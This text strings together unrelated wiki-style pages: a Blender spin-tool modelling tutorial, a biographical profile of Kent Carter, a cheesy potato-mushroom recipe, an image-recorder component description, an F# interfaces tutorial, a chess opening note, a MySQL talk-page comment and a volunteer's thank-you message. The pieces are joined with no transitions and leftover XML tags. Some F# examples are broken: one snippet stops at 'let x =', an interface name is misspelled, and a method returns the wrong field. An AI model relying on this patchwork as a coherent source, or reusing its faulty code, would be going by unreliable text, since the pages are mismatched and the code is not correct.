Open Blender. Don't remove the default cube cause we are going to use it. If you don't have any object after you open Blender (like mine), add a mesh object. Any of them will do. I tend to use the plane. At this time it is good to give your object a proper name. Name it sensibly, like &quot;wineglass&quot; if we are modeling a wineglass. This will help us locate it if there comes a time when we have a lot of objects in our scene. We don't want to have all objects to be called cube.001, sphere.003 or something. That could get confusing.

Hit Tab key to enter Edit Mode, if we are not in there yet. Select all vertices by hitting AKey, then delete them with XKey -&gt; Vertices. Then go to the front view be hitting Num1.

Now, we are going to make the outline by creating vertices. Press and hold CtrlKey then click the left mouse button. A new vertex would be created. Click the left mouse button again, another vertici would be created but this time it is connected to the previous vertici by an edge. Click again to add more vertices. We are going to use this to create our outline.

You might notice that the 3d manipulator (red, green and blue arrows) could get in the way. Deactivate it by hitting Ctrl+Space Bar, then select Enable/Disable, or by clicking the white pointing hand icon in the 3d view window.

Lets start making the outline. Delete our previously created vertices first. Using what we have learned, lets create vertices again but this time lets add them to form some sort of outline. let us be creative here. It could be anything you want. Here I make two to illustrate two situations that we might encounter when modeling with the Spin tool. That is modeling objects that are hollow or non hollow.

[[Image:HalfOutlineDrinkingGlass.jpg|thumb|center|315px|Half outline of a drinking glass]]

Here, the first one, is an outline of a glass. Here, we are modeling an object that is not hollow. We had two vertices that are located in the center of our would be glass bottom. We need to align the two central vertices perfectly along the z axis. Select this two vertices then scale it along the x axis to zero (SKey, xKey, 0Key, Enter). 

[[Image:HalfOutlineNapkinRing.jpg|thumb|center|341px|Half outline of a napkin ring]]

The second one I will make into a napkin ring. This time our outline is closed and no vertices are located in the center of our would be napkin ring. Here we are modeling an object that is hollow.

To make the closed outline, select the two vertices on the open side then press FKey. The two vertices would be bridged by an edge, thus closing the outline.

Adjust vertices when necessary.

For those who may like to have an image in the background to guide them. Upload a background image by selecting the View menu from the 3d View Window then select &quot;Background Image&quot;. A new internal window would appear. Click &quot;Use Background Image&quot; Button, then click &quot;Load&quot;. Navigate to where the Image is located select it then click &quot;SELECT IMAGE&quot;. Our image would appear on the 3d Window as a background. Bellow, I used a picture of a wineglass.

[[Image:HAlfOutlineWineGlass.jpg|thumb|center|362px|Half outline of a wineglass with a background image as a guide]]

====Spinning Our Outline====

Now that the outline is finished, we are ready to use it with the Spin tool

Two things you must know is that the Spin tool is dependent on the location of the 3d cursor, and view where we activate our Spin tool.

[[Image:OriginalOutlineInBlender.jpg|thumb|center|362px|Setup with an arbitrary shape]]

Here is our setup with the vertices all selected. In the nest pictures are results when this shape is spun with the 3d cursor at different locations.

[[Image:OutlineSpunInBlender1.jpg|thumb|center|362px|Shape spun with 3d cursor at the origin]]

[[Image:OutlineSpunInBlender2.jpg|thumb|center|362px|Shape spun with 3d cursor at another location]]

Here we have the same shape but is spun around in different views.

[[Image:ShapeInTopView.jpg|thumb|362px|center|Shape seen in top view]][[Image:OutlineSpunInBlender3.jpg|thumb|center|362px|Shape spun in top view]]

[[Image:ShapeInArbitraryView.jpg|thumb|362px|center|Shape seen in an arbitrary view]][[Image:OutlineSpunInBlender4.jpg|thumb|center|362px|Shape spun in an arbitrary view]]

Note that its important only to place the 3d cursor properly relative to the view where you are going to use the Spin tool

======Placing Our 3d Cursor======

We can see that the location of our 3d cursor is very important in Spin modeling so we need to know how to place it properly. If you prepare it to be, the cursor would already be in position after we make our outline but accidents happen and we accidentally misplaced our 3d cursor. Here are some ways we could make our 3d cursor go to the place where we want it to be.

======Snapping======

Snapping the 3D cursor is a quick and simple way to place our 3d cursor to its proper location. In the 3d window, hit Shift + SKey. A list of options would appear. We are interested with the last three options, namely the cursor snaps options. They are the Cursor-&gt;Selection, Cursor-&gt;Grid and Cursor-&gt;Active. The name are pretty descriptive but we'll give a short description here.

Cursor-&gt;Selection places the cursor to the exact location of our selected element or elements. In case of multiple selected elements, our cursor is placed on the median of the selected elements. In edit mode, select a vertex and use Cursor-&gt;Selection snap to it. Our 3d cursor would jump to the exact place where our selected vertex is located.

Cursor-&gt;Selection snapping is especially useful when modeling non hollow objects because there are vertex or vertices located at the center of our model to snap to. Just select one central vertex and snap to it.

[[Image:CursorSelectionSnapDemo_Before.jpg‎ |thumb|center|298px|Here our 3d cursor is not at the center of our drinking glass outline. We select one of the central vertex and do Cursor-&gt;Selection snapping.]]

[[Image:CursorSelectionSnapDemoAfter.jpg‎|thumb|center|293px|Result after doing the Cursor-&gt;Selection snap.]]


Cursor-&gt;Grid snaps the cursor to the nearest cross of the visible grid. Try clicking at a center of a square in our Blender's grid and use it. See its effect.

Cursor-&gt;Grid snapping is useful for spin modeling hollow models. Usually if you are careful, our object outline would be on a plane that contains one of the axises.  If we make our outline in front view as advised, go to the top view (or side view depending on what we are modeling). If you are doing okay, you will see all our vertices aligned perfectly along the x axis. It just a matter of LMB close to a cross on the grid that contains our objects center then snap to it.

Cursor-&gt;Active might not be so helpful in spin modeling. Cursor-&gt;Active snaps the cursor to the active element (usually the element that is last to be selected). Try it by selecting several vertices, then do Cursor-&gt;Active snap. The vertex where the 3d cursor goes is the active element in your selection.

======Spin Tool Parameters======

The spin accepts two parameters to execute its function. These are Degrees (degr) and Steps.

[[image:BlenderDegr.jpg]]

'''Degrees''' specifies the angle at which the selected geometry will be rotated from its initial position around the axis. It accepts values in degrees. A 360 degrees value being a whole turn around the axis. Values lesser than 360 produces something like a wedge is sliced from the side of the form.

{{Noframecenter|1=[[Image:BlenderParameterShape.jpg]]|2=Sample Outline}}

{{Noframecenter|1=[[Image:BlenderSpintoolIntroDegrParameter245degrees.jpg|554px]]|2=Sample Outline Spun with Degress parameter set at 245 degrees}}

{{Noframecenter|1=[[Image:BlenderSpintoolIntroDegrParameter360degrees.jpg|554px]]|2=Sample Outline Spun with Degress parameter set at 360 degrees}}

[[image:BlenderSteps.jpg|none]]

'''Steps''' specifies the number of &quot;copies&quot; of the selected geometry the spin tool makes that it arranges in a radial array around the 3d cursor. A higher value result in much rounder form.

{{Noframecenter|1=[[Image:BlenderSpintoolIntroStepsParameter4Steps.jpg|554px]]|2=Sample Outline Spun with Steps parameter set at 4 steps}}

{{Noframecenter|1=[[Image:BlenderSpintoolIntroStepsParameter32Steps.jpg|554px]]|2=Sample Outline Spun with Steps parameter set at 32 steps}}

====Cleaning Up the resulting Mesh====
After using the spin tool, a little up work might be necessary, especially if you specified a 360 degree turn. Though the mesh looks clean to the eye, the tool actually make geometries (vertices) that are in the same blender position as another one. So what might look like one vertex may actually be two. A simple way to clean up our mesh would be to select the whole geometry then activating the &quot;remove doubles&quot; from the specials menu ( Wkey(Specials Menu) -&gt; remove doubles or Wkey-&gt;6key). This would remove these problem geometries, finds vertices that are too close to each other and merging them to one.

==Post Modeling==
After the lathe able parts are done it would be ready to adding non latheable parts. For example a cup may have a bowl-like body, that we could use the spintool. Alas the handle can't be so we had to put it there after. Depending on the geometry added. This geometries could be formed from the mesh itself or be adding in a separate mesh.

The founder, Kent T Carter of SC American Connections SRL, named the organization after his fathers ranch (MonkeyWrench Ranch) back in Oregon, in memory of his father. In 2001, a fire took everything but the land itself from Mr. Carter, and with newly imposed government retrictions, was not allowed to rebuild a home on the land. Without ability to live there, Mr. carter made the decision to leave the gestapo tactics of the small town goverment in his home towm area, and venture forth into the world to find a new begining. He now resides in Bucharest ROMANIA where he discovered the love for creating Video Game Assets.</text>

      <text xml:space="preserve">East Oregonian Newpaper 2005 Not many people get to start over at 50, but Kent Carter has. Carter was born on a cattle ranch in Eastern Oregon in the spring of 1954. The circumstances of his parent’s union offered a premonition of the tumultuous times ahead for their son. His father, Ted Carter, came from cattle people. His mother, Verna Ward, came from sheep people. They married while the “range wars” over the use of land for cattle or sheep were raging, and both their families opposed the marriage. His country upbringing included working on the ranch and attending the Grant County Fair and the Pendleton Round-Up. His parents separated when he was 11, and his independent streak intensified. He points to his lineage for an excuse for his wanderlust. He claims to be part Nez Perce, Irish, Cherokee, and Scottish, topped off with Aries (Berbec in Romanian). He went to college in Eugene but didn’t last long. “I wasted it all on parties and feeling bad about what I did with my father’s college fund,” he says. He joined the Navy with an eye on the G.I. Bill, allowing him to travel widely. “The closest I came to Eastern Europe was in Greece,” he recalls. The region was mired in the Cold War at the time. After serving in the Navy, he married but eventually joined the Army when he couldn’t find a job. All told, he spent 17 years in the military. He lived in Montana, then Wyoming, and obtained two associates degrees. When his father died in 1990, he moved back to the ranch where he grew up near Long Creek — a logging and ranching town of 230 an hour south of Ukiah. It became increasingly difficult to make the ranch profitable, so he worked as watermaster and maintenance supervisor for Long Creek for more than four years, but that segment of his life ended in disaster and recriminations. He was suspended from his job in the spring of 2001. About two weeks later, his rural Long Creek home burned to the ground in an unexplained fire the volunteer fire department didn’t respond to until it was much too late to help. The next day, he was fired by the City Council. The city offered no public explanation at the time, and Carter declines to talk about it other than to attribute the episode to “small-town politics.” But he acknowledges it was the beginning of the end of his life as he knew it. Getting back on his feet after losing his home and job proved nearly impossible. He says he was unable to cut through the red tape to gain approval to rebuild his home. He lived in a small trailer on the site without electricity, running a computer with a gas generator. His relationship of eight years gradually crumbled under the strain, compounded by legal problems from driving violations. “Also, every time I went out the door, I had to look at this site (of the fire) and this kept all the pain of my loses very prominent in my mind,” he admits The computer ended up being his ticket out. As he worked to establish some on-line businesses, he began chatting with people from around the world, particularly in Russia and Romania. With his life in the United States floundering, Carter made the bold decision to visit Romania and a women he’d met there through the Internet. He contracted with a man to provide hunting rights on his land, leased some land not used for pasture and agreed to sell his cattle to raise money to head to Romania to meet the woman “I had communicated with for several months by Internet, letters and telephone.” Once again, life threw him for a loop. The woman had a boyfriend and “had lied to me about many things; but she did help me get established here.” He’s still struggling to find his niche in Bucharest, after working several short-term jobs and suffering the failure of a food store venture when his associate left town. “To this date, I have lived in seven different locations within Bucharest and know very well how to get around the center of the city,” he says, noting with a laugh that people often ask him for directions. He’s had to sell his ranch near Long Creek, but life is looking up in Romania. He used the money to register his business, American Connections, which he bills as “connecting the world to modern Romania.” He offers to help outsiders with real estate, communications, advertising, touring, investment or development in the country of 23 million (reached at americanconnectionsromania.com). He’s finally secured a permanent visa and hopes to eventually return to northeast Oregon to visit his mother and reclaim his 1958 Harley Davidson motorcycle, “one of the few things I saved from the fire that I really value.” He’s also met “a wonderful woman ... We have now been together for over a year, and I hope to marry and make a family with her.” The language continues to be a challenge, and Carter still misses the land where he grew up. But he has no regrets starting over in Romania. Many people from his old life and his new one have asked why he made such a drastic change. “The only answer I can give anyone is that I came here to go beyond the pain in my heart from my loses from the past, start a new life, and to be free.” ——— Hal McCune is a senior reporter and columnist with the East Oregonian.</text>

{{recipe}}

==Ingredients==
* 4 pieces of potatoes
* 200 gr/ 8 oz / 0.4 pound mushroom
* Olive oil
* 1 pack of cream- 200 ml/ 1 cup
* 200 gr / 8 oz / 0.4 pound fresh white cheese or hellim or mozzarella or dried curd cheese, actually any cheese
* Salt, black pepper, red pepper
* White bread grates or bread crumbs

==Procedure==
# Boil the potatoes slightly. Slice them or mash them. Mix it with salt and black pepper.
# Sauté the mushroom in oil slightly. I used butter because I thought it would taste better with the potatoes.
# Oil the glass pot slightly. Lay the half of the potatoes as a base and lay the mushrooms over them. Add half of the cream and spices over them. Drizzle some dry bread and cheese over them. Lay the remaining potatoes over and pour the remaining cream over all. Drizzle some more dry bread grates.
# Leave it in the oven for 20 minutes. Add some more cheese on it put it back to oven again.</text>

== Description ==

This component allows to record the image by saving each frame to a
separate image file. These images can be used by other programs, or,
for example they can be converted into a video with mplayer.

Beware that the place where this component is used has a big influence
on the result, as it use the images that are processed. For example,
showing the black and white image after the blob selection will show
only the selected blobs. As a rule of thumb, the display will
corresponds to what is displayed in the last previous component
displaying the wanted image.

== Input ==
The gray, the color or the binary image.

== Output ==

The images as separate files.

== Parameters ==

=== Prefix ===

The filename prefix to use. Frame number and file extension will be
added automatically.

The frame number will be zero-padded to 8 chars, so that alphabetical
order of the filenames will correspond to the numerical order of the
frames.

If the prefix contains directories (for example, it is 'frames/frame') those directories will be created as needed.

=== File type ===

Note that png format is quite slow. bmp is very fast, but the resulting files  are pretty big.</text>

{{fsharpTitle|Interfaces}}

An object's '''interface''' refers to all of the public members and functions that a function exposes to consumers of the object. For example, take the following:

&lt;source lang=&quot;ocaml&quot;&gt;
type Monkey(name : string, birthday : DateTime) =
    let mutable _birthday = birthday
    let mutable _lastEaten = DateTime.Now
    let mutable _foodsEaten = [] : string list
    
    member this.Speak() = printfn &quot;Ook ook!&quot;
    member this.Name = name
    member this.Birthday
        with get() = _birthday
        and set(value) = _birthday &lt;- value
        
    member internal this.UpdateFoodsEaten(food) = _foodsEaten &lt;- food :: _foodsEaten
    member internal this.ResetLastEaten() = _lastEaten &lt;- DateTime.Now
    member this.IsHungry = (DateTime.Now - _lastEaten).TotalSeconds &gt;= 5.0
    member this.GetFoodsEaten() = _lastEaten
    member this.Feed(food) =
        this.UpdateFoodsEaten(food)
        this.ResetLastEaten()
        this.Speak()
&lt;/source&gt;

This class contains several public, private, and internal members. However, consumers of this class can only access the public members; when a consumer uses this class, they see the following interface:
&lt;source lang=&quot;ocaml&quot;&gt;
type Monkey =
  class
    new : name:string * birthday:DateTime -&gt; Monkey
    member Feed : food:string -&gt; unit
    member GetFoodsEaten : unit -&gt; DateTime
    member Speak : unit -&gt; unit
    member Birthday : DateTime
    member IsHungry : bool
    member Name : string
    member Birthday : DateTime with set
  end
&lt;/source&gt;

Notice the &lt;code&gt;_birthday&lt;/code&gt;, &lt;code&gt;_lastEaten&lt;/code&gt;, &lt;code&gt;_foodsEaten&lt;/code&gt;, &lt;code&gt;UpdateFoodsEaten&lt;/code&gt;, and &lt;code&gt;ResetLastEaten&lt;/code&gt; members are inaccessible to the outside world, so they are not part of this object's public interface.

All interfaces you've seen so far have been intrinsically tied to a specific object. However, F# and many other OO languages allow users to define interfaces as stand-alone types, allowing us to effectively ''separate an object's interface from its implementation''.

== Defining Interfaces ==
According to the [http://research.microsoft.com/en-us/um/cambridge/projects/fsharp/manual/spec2.aspx#_Toc207785736 F# specification], interfaces are defined with the following syntax:

&lt;source lang=&quot;ocaml&quot;&gt;
type type-name = 
   interface
       inherits-decl 
       member-defns 
   end
&lt;/source&gt;

: '''Note:''' The interface/end tokens can be omitted when using the #light syntax option, in which case Type Kind Inference ([http://research.microsoft.com/en-us/um/cambridge/projects/fsharp/manual/spec2.aspx#_Toc207785727 §10.1]) is used to determine the kind of the type. The presence of any non-abstract members or constructors means a type is not an interface type.

For example:
&lt;source lang=&quot;ocaml&quot;&gt;
type ILifeForm = (* .NET convention recommends the prefix 'I' on all interfaces *)
    abstract Name : string
    abstract Speak : unit -&gt; unit
    abstract Eat : unit -&gt; unit
&lt;/source&gt;


== Using Interfaces ==
Since they only define a set of public method signatures, users need to create an object to ''implement'' the interface. Here are three classes which implement the ILifeForm interface in fsi:

&lt;source lang=&quot;ocaml&quot;&gt;
&gt; type ILifeForm =
    abstract Name : string
    abstract Speak : unit -&gt; unit
    abstract Eat : unit -&gt; unit
    
type Dog(name : string, age : int) =
    member this.Age = age

    interface ILifeForm with
        member this.Name = name
        member this.Speak() = printfn &quot;Woof!&quot;
        member this.Eat() = printfn &quot;Yum, doggy biscuits!&quot;
        
type Monkey(weight : float) =
    let mutable _weight = weight
    
    member this.Weight
        with get() = _weight
        and set(value) = _weight &lt;- value
        
    interface ILifeForm with
        member this.Name = &quot;Monkey!!!&quot;
        member this.Speak() = printfn &quot;Ook ook&quot;
        member this.Eat() = printfn &quot;Bananas!&quot;
        
type Ninja() = 
    interface ILifeForm with
        member this.Name = &quot;Ninjas have no name&quot;
        member this.Speak() = printfn &quot;Ninjas are silent, deadly killers&quot;
        member this.Eat() =
            printfn &quot;Ninjas don't eat, they wail on guitars because they're totally sweet&quot;;;

type ILifeForm =
  interface
    abstract member Eat : unit -&gt; unit
    abstract member Speak : unit -&gt; unit
    abstract member Name : string
  end
type Dog =
  class
    interface ILifeForm
    new : name:string * age:int -&gt; Dog
    member Age : int
  end
type Monkey =
  class
    interface ILifeForm
    new : weight:float -&gt; Monkey
    member Weight : float
    member Weight : float with set
  end
type Ninja =
  class
    interface ILifeForm
    new : unit -&gt; Ninja
  end
&lt;/source&gt;

Typically, we call an interface an ''abstraction'', and any class which implements the interface as a ''concrete implementation''. In the example above, &lt;code&gt;ILifeForm&lt;/code&gt; is an abstraction, whereas &lt;code&gt;Dog&lt;/code&gt;, &lt;code&gt;Monkey&lt;/code&gt;, and &lt;code&gt;Ninja&lt;/code&gt; are concrete implementations.

Its worth noting that interfaces only define instance members signatures on objects. In other words, they cannot define static member signatures or constructor signatures.

=== What are interfaces used for?''' ===

Interfaces are a mystery to newbie programmers (after all, what's the point of creating a type with no implementation?), however they are essential to many object-oriented programming techniques. Interfaces allow programmers to generalize functions to all classes which implement a particular interface, even if those classes don't necessarily descend from one another. For example, using the &lt;code&gt;Dog&lt;/code&gt;, &lt;code&gt;Monkey&lt;/code&gt;, and &lt;code&gt;Ninja&lt;/code&gt; classes defined above, we can write a method to operate on all of them, as well as any other classes which implement the ILifeForm interface.

=== Implementing Interfaces with Object Expressions ===
Interfaces are extremely useful for sharing snippets of implementation logic between other classes, however it can be very cumbersome to define and implement a new class for ad hoc interfaces. Object expressions allow users to implement interfaces on anonymous classes using the [http://research.microsoft.com/en-us/um/cambridge/projects/fsharp/manual/spec2.aspx#_Toc207785612 following syntax]:

&lt;source lang=&quot;ocaml&quot;&gt;
{ new ty0 [ args-expr ] [ as base-ident ] [ with 
      val-or-member-defns end ]
 
  interface ty1 with [ 
      val-or-member-defns1 
   end ]
 
  …

  interface tyn with [ 
      val-or-member-defnsn  
  end ] }
&lt;/source&gt;

Using a concrete example, the .NET BCL has a method called &lt;code&gt;[http://msdn.microsoft.com/en-us/library/bzw8611x.aspx System.Array.Sort&lt;T&gt;(T array, IComparer&lt;T&gt;)]&lt;/code&gt;, where &lt;code&gt;[http://msdn.microsoft.com/en-us/library/6zzyats9.aspx IComparer&lt;T&gt;]&lt;/code&gt; exposes a single method called &lt;code&gt;Compare&lt;/code&gt;. Let's say we wanted to sort an array on an ad hoc basis using this method; rather than litter our code with one-time use classes, we can use object expressions to define anonymous classes on the fly:

&lt;source lang=&quot;ocaml&quot;&gt;
&gt; open System
open System.Collections.Generic

type person = { name : string; age : int }

let people =
    [| { name = &quot;Larry&quot;; age = 20 };
      { name = &quot;Moe&quot;; age = 30 };
      { name = &quot;Curly&quot;; age = 25 } |]
      
let sortAndPrint msg items (comparer : System.Collections.Generic.IComparer&lt;person&gt;) =
    Array.Sort(items, comparer)
    printf &quot;%s: &quot; msg
    Seq.iter (fun x -&gt; printf &quot;(%s, %i) &quot; x.name x.age) items
    printfn &quot;&quot;

(* sorting by age *)    
sortAndPrint &quot;age&quot; people { new IComparer&lt;person&gt; with member this.Compare(x, y) = x.age.CompareTo(y.age) }

(* sorting by name *)
sortAndPrint &quot;name&quot; people { new IComparer&lt;person&gt; with member this.Compare(x, y) = x.name.CompareTo(y.name) }

(* sorting by name descending *)
sortAndPrint &quot;name desc&quot; people { new IComparer&lt;person&gt; with member this.Compare(x, y) = y.name.CompareTo(x.name) };;

type person =
  {name: string;
   age: int;}
val people : person array
val sortAndPrint : string -&gt; person array -&gt; IComparer&lt;person&gt; -&gt; unit

age: (Larry, 20) (Curly, 25) (Moe, 30) 
name: (Curly, 25) (Larry, 20) (Moe, 30) 
name desc: (Moe, 30) (Larry, 20) (Curly, 25)
&lt;/source&gt;

=== Implementing Multiple Interfaces ===
Unlike inheritance, its possible to implement multiple interfaces:

&lt;source lang=&quot;ocaml&quot;&gt;
open System

type Person(name : string, age : int) = 
    member this.Name = name
    member this.Age = age
    
    (* IComparable is used for ordering instances *)
    interface IComparable&lt;Person&gt; with
        member this.CompareTo(other) =
            (* sorts by name, then age *)
            match this.Name.CompareTo(other.Name) with
            | 0 -&gt; this.Age.CompareTo(other.Age)
            | n -&gt; n
    
    (* Used for comparing this type against other types *)
    interface IEquatable&lt;string&gt; with
        member this.Equals(othername) = this.Name.Equals(othername)
&lt;/source&gt;

Its just as easy to implement multiple interfaces in object expressions as well.

=== Interface Hierarchies ===

Interfaces can extend other interfaces in a kind of interface hierarchy. For example:

&lt;source lang=&quot;ocaml&quot;&gt;
type ILifeForm =
    abstract member location : System.Drawing.Point

type 'a IAnimal =   (* interface with generic type parameter *)
    inherit ILifeForm
    inherit System.IComparable&lt;'a&gt;
    abstract member speak : unit -&gt; unit
    
type IFeline =
    inherit IAnimal&lt;IFeline&gt;
    abstract member purr : unit -&gt; unit
&lt;/source&gt;

When users create a concrete implementation of &lt;code&gt;IFeline&lt;/code&gt;, they are required to provide implementations for all of the methods defined in the &lt;code&gt;IAnimal&lt;/code&gt;, &lt;code&gt;IComparable&lt;/code&gt;, and &lt;code&gt;ILifeForm&lt;/code&gt; interfaces.

: '''Note:''' Interface hierarchies are occasionally useful, however deep, complicated hierarchies can be cumbersome to work with.

== Examples ==
=== Generalizing a function to many classes ===

&lt;source lang=&quot;ocaml&quot;&gt;
open System
type ILifeForm =
    abstract Name : string
    abstract Speak : unit -&gt; unit
    abstract Eat : unit -&gt; unit
    
type Dog(name : string, age : int) =
    member this.Age = age

    interface ILifeForm with
        member this.Name = name
        member this.Speak() = printfn &quot;Woof!&quot;
        member this.Eat() = printfn &quot;Yum, doggy biscuits!&quot;
        
type Monkey(weight : float) =
    let mutable _weight = weight
    
    member this.Weight
        with get() = _weight
        and set(value) = _weight &lt;- value
        
    interface ILifeForm with
        member this.Name = &quot;Monkey!!!&quot;
        member this.Speak() = printfn &quot;Ook ook&quot;
        member this.Eat() = printfn &quot;Bananas!&quot;
        
type Ninja() = 
    interface ILifeForm with
        member this.Name = &quot;Ninjas have no name&quot;
        member this.Speak() = printfn &quot;Ninjas are silent, deadly killers&quot;
        member this.Eat() =
            printfn &quot;Ninjas don't eat, they wail on guitars because they're totally sweet&quot;

let lifeforms =
    [(new Dog(&quot;Fido&quot;, 7) :&gt; ILifeForm);
     (new Monkey(500.0) :&gt; ILifeForm);
     (new Ninja() :&gt; ILifeForm)]            

let handleLifeForm (x : ILifeForm) =
    printfn &quot;Handling lifeform '%s'&quot; x.Name
    x.Speak()
    x.Eat()
    printfn &quot;&quot;
    
let main() =
    printfn &quot;Processing...\n&quot;
    lifeforms |&gt; Seq.iter handleLifeForm
    printfn &quot;Done.&quot;
    
main()&lt;/source&gt;

This program has the following types:

&lt;source lang=&quot;ocaml&quot;&gt;
type ILifeForm =
  interface
    abstract member Eat : unit -&gt; unit
    abstract member Speak : unit -&gt; unit
    abstract member Name : string
  end

type Dog =
  class
    interface ILifeForm
    new : name:string * age:int -&gt; Dog
    member Age : int
  end

type Monkey =
  class
    interface ILifeForm
    new : weight:float -&gt; Monkey
    member Weight : float
    member Weight : float with set
  end

type Ninja =
  class
    interface ILifeForm
    new : unit -&gt; Ninja
  end

val lifeforms : ILifeForm list
val handleLifeForm : ILifeForm -&gt; unit
val main : unit -&gt; unit
&lt;/source&gt;

This program outputs the following:

&lt;pre&gt;
Processing...

Handling lifeform 'Fido'
Woof!
Yum, doggy biscuits!

Handling lifeform 'Monkey!!!'
Ook ook
Bananas!

Handling lifeform 'Ninjas have no name'
Ninjas are silent, deadly killers
Ninjas don't eat, they wail on guitars because they're totally sweet

Done.&lt;/pre&gt;

=== Using interfaces in generic type definitions ===
We can constrain generic types in class and function definitions to particular interfaces. For example, let's say that we wanted to create a binary tree which satisfies the following property: each node in a binary tree has two children, &lt;code&gt;left&lt;/code&gt; and &lt;code&gt;right&lt;/code&gt;, where all of the child nodes in &lt;code&gt;left&lt;/code&gt; are less than all of its parent nodes, and all of the child nodes in &lt;code&gt;right&lt;/code&gt; are greater than all of its parent nodes.

We can implement a binary tree with these properties defining a binary tree which constrains our tree to the &lt;code&gt;IComparable&lt;T&gt;&lt;/code&gt; interface.

: '''Note:''' .NET has a number of interfaces defined in the BCL, including the very important &lt;code&gt;[http://msdn.microsoft.com/en-us/library/4d7sx9hd.aspx IComparable&lt;T&gt; interface]&lt;/code&gt;. IComparable exposes a single method, [http://msdn.microsoft.com/en-us/library/43hc6wht.aspx objectInstance.CompareTo(otherInstance)]&lt;/code&gt;, which should return 1, -1, or 0 when the &lt;code&gt;objectInstance&lt;/code&gt; is greater than, less than, or equal to &lt;code&gt;otherInstance&lt;/code&gt; respectively. Many classes in the .NET framework already implement IComparable, including all of the numeric data types, strings, and datetimes.

For example, using fsi:

&lt;source lang=&quot;ocaml&quot;&gt;
&gt; open System

type tree&lt;'a&gt; when 'a :&gt; IComparable&lt;'a&gt; =
    | Nil
    | Node of 'a * 'a tree * 'a tree

let rec insert (x : #IComparable&lt;'a&gt;) = function
    | Nil -&gt; Node(x, Nil, Nil)
    | Node(y, l, r) as node -&gt;
        if x.CompareTo(y) = 0 then node
        elif x.CompareTo(y) = -1 then Node(y, insert x l, r)
        else Node(y, l, insert x r)
        
let rec contains (x : #IComparable&lt;'a&gt;) = function
    | Nil -&gt; false
    | Node(y, l, r) as node -&gt;
        if x.CompareTo(y) = 0 then true
        elif x.CompareTo(y) = -1 then contains x l
        else contains x r;;

type tree&lt;'a&gt; when 'a :&gt; IComparable&lt;'a&gt;&gt; =
  | Nil
  | Node of 'a * tree&lt;'a&gt; * tree&lt;'a&gt;
val insert : 'a -&gt; tree&lt;'a&gt; -&gt; tree&lt;'a&gt; when 'a :&gt; IComparable&lt;'a&gt;
val contains : #IComparable&lt;'a&gt; -&gt; tree&lt;'a&gt; -&gt; bool when 'a :&gt; IComparable&lt;'a&gt;

&gt; let x =

=== Simple dependency injection ===
Dependency injection refers to the process of supplying an external dependency to a software component. For example, let's say we had a class which, in the event of an error, sends an email to the network administrator, we might write some code like this:

&lt;source lang=&quot;ocaml&quot;&gt;
type Processor() =
    (* ... *)
    member this.Process items =
        try
            (* do stuff with items *)
        with
            | err -&gt; (new Emailer()).SendMsg(&quot;admin@company.com&quot;, &quot;Error! &quot; + err.Message)
&lt;/source&gt;

The &lt;code&gt;Process&lt;/code&gt; method creates an instance of &lt;code&gt;Emailer&lt;/code&gt;, so we can say that the &lt;code&gt;Processor&lt;/code&gt; class ''depends'' on the &lt;code&gt;Emailer&lt;/code&gt; class.

Let's say we're testing our &lt;code&gt;Processor&lt;/code&gt; class, and we don't want to be sending emails to the network admin all the time. Rather than comment out the lines of code we don't want to run while we test, its much easier to substitute the &lt;code&gt;Emailer&lt;/code&gt; dependency with a dummy class instead. We can achieve that by passing in our dependency through the constructor:

&lt;source lang=&quot;ocaml&quot;&gt;
type IFailureNotifier =
    abstract Notify : string -&gt; unit

type Processor(notifier : IFailureNotifier) =
    (* ... *)
    member this.Process items =
        try
            // do stuff with items
        with
            | err -&gt; notifier.Notify(err.Message)

(* concrete implementations of IFailureNotifier *)

type EmailNotifier() =
    interface IFailureNotifier with
        member Notify(msg) = (new Emailer()).SendMsg(&quot;admin@company.com&quot;, &quot;Error! &quot; + msg)
        
type DummyNotifier() =
    interface IFailureNotifier with
        member Notify(msg) = () // swallow message
        
type LogfileNotifier(filename : string) =
    interface IFailureNotifer with  
        member Notify(msg) = System.IO.File.AppendAllText(filename, msg)
&lt;/source&gt;

Now, we create a processor and pass in the kind of FailureNotifier we're interested in. In test environments, we'd use &lt;code&gt;new Processor(new DummyNotifier())&lt;/code&gt;; in production, we'd use &lt;code&gt;new Processor(new EmailNotifier())&lt;/code&gt; or &lt;code&gt;new Processor(new LogfileNotifier(@&quot;C:\log.txt&quot;))&lt;/code&gt;.

To demonstrate dependency injection using a somewhat contrived example, the following code in fsi shows how to hot swap one interface implementation with another:

&lt;source lang=&quot;ocaml&quot;&gt;
&gt; #time;;

===3...c6===
{{ChessStub}}
In this position, by delaying Nf6, Black keeps many opportunities open. He can keep on playing in the normal Queen's Gambit Declined (QGD) fashion with 4...Nf6 (whether white plays e3 or Nf3), or can try different other options. 

4.Nf3 can lead to regular QGD games or, for example, the Noteboom variation : 4...dxc4. Here, Black aims to get two passed flanked pawns in exchange for White's big center. The middlegame is critical, but if Black survives, then the endgame is favorable for him. 

On the other hand 4.e3 can lead to a stonewall defense position with 4...f5, where Black's usual plan is a quick attack on the king side and can often involve a rook lift to f6.

Another option for White, though less popular, is the Marshall Gambit of the Semi-Slav, with 4.e4. This move aims at exploiting Black's lack of control of e4, not having played Nf6. Main line goes 4...dxe4 5.Nxe4 Bb4+ 6.Bd2 Qxd4 7.Bxb4 Qxe4+ with a sharp game. Usually White blocks with Be2 and leaves the g2 pawn hanging. Black can capture it, but not the rook (Bf3 wins the queen). In return, White can have annoying pressure and tactics involving the d6 weakness. A recent game played in this line is Bacrot - Morozevich, Biel Rd2, 2012.

      <text xml:space="preserve">I added a section: &quot;Metadata about Storage Engines&quot;.

I think that this page name should be changed. &quot;Table Types&quot; is an obsolete term and syntaxes like SHOW TABLE TYPES are now deprecated. The term &quot;Storage Engines&quot; should be used instead.

== Merging to optimization ==

I don't think this should be merged to optimization. Table types have an effect on optimization, but that's not the only reason for choosing one table type over another (locking strategy can be important for reasons other than performance). --[[User:Fishpi|Fishpi]] ([[User talk:Fishpi|discuss]] • [[Special:Contributions/Fishpi|contribs]]) 15:39, 18 February 2011 (UTC)</text>

      <text xml:space="preserve">I am a retired Police Officer. As an Officer I maintained the computers running and maintained them in great working order.
Being retired now I find I have a lot of time on my hands and decided to teach computer literacy to Seniors at the Local community center 3 days a week for a total of six to seven hours weekly. This is on volatary basis as they are non profit and could not afford my fees. So out of the kindness of my heart I've purchased printers that needed and tried to aquire computers from corporations and others who would be willing to donate for the use of the Seniors. 
The center Director is happy with my group who make signs and posters and all we are allowed to ask for are ink, paper and the space or classroom. And now I am very happy to have found this site to get materials to teach.
Thank you,

== attention required ==

